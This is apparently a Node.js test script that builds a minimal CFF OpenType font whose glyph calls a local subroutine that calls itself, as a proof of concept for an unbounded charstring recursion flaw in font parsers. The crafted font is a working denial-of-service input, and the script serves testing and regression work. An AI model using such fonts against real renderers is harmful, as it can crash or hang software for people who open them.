/**
 * Generates a minimal CFF OpenType font with circular subroutine references.
 * This is a proof-of-concept for CVE: CFF Charstring VM Unbounded Subroutine Recursion.
 *
 * The font has one glyph (index 1) whose charstring calls local subroutine 0,
 * which in turn calls itself recursively via `callsubr`, creating infinite recursion.
 *
 * Usage: node test/generate-recursive-cff-font.mjs
 * Output: test/fonts/CFFRecursionTest.otf
 */

import { writeFileSync } from 'fs';
import {
    u8, u16, u32, i16, tag,
    makeHead, makeHhea, makeMaxp, makeOS2, makeName, makeHmtx, makeCmap, makePost,
    assembleFont,
} from './font-generation-helpers.mjs';

// --- CFF-specific helpers ---

// CFF number encoding (Type 2 charstring format)
function cffInt(v) {
    if (v >= -107 && v <= 107) return [v + 139];
    if (v >= 108 && v <= 1131) { v -= 108; return [((v >> 8) + 247), v & 0xFF]; }
    if (v >= -1131 && v <= -108) { v = -v - 108; return [((v >> 8) + 251), v & 0xFF]; }
    return [28, (v >> 8) & 0xFF, v & 0xFF]; // 16-bit
}

// CFF DICT number encoding (different from charstring)
function dictInt(v) {
    if (v >= -107 && v <= 107) return [v + 139];
    if (v >= 108 && v <= 1131) { v -= 108; return [((v >> 8) + 247), v & 0xFF]; }
    if (v >= -1131 && v <= -108) { v = -v - 108; return [((v >> 8) + 251), v & 0xFF]; }
    // 5-byte integer
    return [29, (v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF];
}

// CFF INDEX structure: count(2) + offSize(1) + offsets(offSize*(count+1)) + data
function cffIndex(items) {
    if (items.length === 0) return [...u16(0)];
    const totalDataLen = items.reduce((s, d) => s + d.length, 0);
    const offSize = totalDataLen + 1 <= 0xFF ? 1 : totalDataLen + 1 <= 0xFFFF ? 2 : 4;
    const result = [...u16(items.length), u8(offSize)];
    let offset = 1;
    for (let i = 0; i <= items.length; i++) {
        if (offSize === 1) result.push(offset & 0xFF);
        else if (offSize === 2) result.push(...u16(offset));
        else result.push(...u32(offset));
        if (i < items.length) offset += items[i].length;
    }
    for (const item of items) result.push(...item);
    return result;
}

// --- Build the CFF table ---

function buildCFF() {
    const fontName = 'RecTest';

    const header = [1, 0, 4, 1]; // major=1, minor=0, hdrSize=4, offSize=1
    const nameIndex = cffIndex([[...tag(fontName)]]);
    const stringIndex = cffIndex([]);
    const gsubrsIndex = cffIndex([]);

    // Glyph 0 (.notdef): just endchar
    const notdefCharstring = [14];
    // Glyph 1: calls local subr 0 (bias=107, so push -107 then callsubr)
    const glyph1Charstring = [...cffInt(-107), 10];
    const charStringIndex = cffIndex([notdefCharstring, glyph1Charstring]);

    // Local subr 0: calls itself recursively
    const subr0 = [...cffInt(-107), 10];
    const localSubrsIndex = cffIndex([subr0]);

    // Private DICT: Subrs offset = its own size (local subrs immediately follow)
    function buildPrivateDict(subrsOffset) {
        return [...dictInt(subrsOffset), u8(19)];
    }
    const finalPrivateDict = buildPrivateDict(buildPrivateDict(0).length);

    function buildTopDict(charstringsOffset, privateDictSize, privateDictOffset) {
        return [
            ...dictInt(charstringsOffset), u8(17),
            ...dictInt(privateDictSize), ...dictInt(privateDictOffset), u8(18),
        ];
    }

    // Two-pass offset resolution (Top DICT size depends on the offset values it encodes)
    const fixedPrefix = header.length + nameIndex.length;
    const fixedSuffix = stringIndex.length + gsubrsIndex.length;
    let topDictIndex;
    for (let pass = 0; pass < 2; pass++) {
        const csOffset = fixedPrefix + (topDictIndex ? topDictIndex.length : 10) + fixedSuffix;
        const pdOffset = csOffset + charStringIndex.length;
        topDictIndex = cffIndex([buildTopDict(csOffset, finalPrivateDict.length, pdOffset)]);
    }

    // Verify self-consistency
    const charstringsOffset = fixedPrefix + topDictIndex.length + fixedSuffix;
    const privateDictOffset = charstringsOffset + charStringIndex.length;
    const verifyIndex = cffIndex([buildTopDict(charstringsOffset, finalPrivateDict.length, privateDictOffset)]);
    if (verifyIndex.length !== topDictIndex.length) {
        throw new Error('CFF Top DICT offset calculation did not converge');
    }

    return [
        ...header, ...nameIndex, ...topDictIndex, ...stringIndex,
        ...gsubrsIndex, ...charStringIndex, ...finalPrivateDict, ...localSubrsIndex,
    ];
}

// --- Build font ---

function buildFont() {
    const numGlyphs = 2;
    return assembleFont({
        'CFF ': buildCFF(),
        'OS/2': makeOS2(),
        'cmap': makeCmap(0x0020),  // space → glyph 1
        'head': makeHead({ indexToLocFormat: 1 }),
        'hhea': makeHhea(numGlyphs),
        'hmtx': makeHmtx(numGlyphs),
        'maxp': makeMaxp(numGlyphs, { cff: true }),
        'name': makeName('RecTest'),
        'post': makePost(),
    }, { sfVersion: 'OTTO' });
}

const fontBytes = buildFont();
const outputPath = new URL('./fonts/CFFRecursionTest.otf', import.meta.url).pathname;
writeFileSync(outputPath, fontBytes);
console.log(`Written ${fontBytes.length} bytes to ${outputPath}`);
